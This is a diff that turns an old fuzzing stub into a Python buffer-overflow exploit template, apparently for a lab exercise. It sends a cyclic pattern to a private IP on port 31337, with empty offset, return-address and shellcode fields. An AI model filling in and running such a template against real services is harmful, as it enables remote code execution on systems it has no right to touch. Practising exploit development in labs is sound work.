@@ -1,21 +1,24 @@
-#!/usr/bin/python 
-#https://github.com/gh0x0st
-#gh0x0st@protonmail.com
+import socket
 
-import socket,sys
+ip = "192.168.0.11"
+port = 31337
 
-address = '127.0.0.1'
-port = 9999
-buffer = #TBD
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab <SNIP>"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((address,port))
-	s.recv(1024)			
-	s.send(buffer + '\r\n')
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(buffer + "\r\n")
+    print("Done!")
 except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
-finally:
-	s.close()
+    print("Could not connect.")
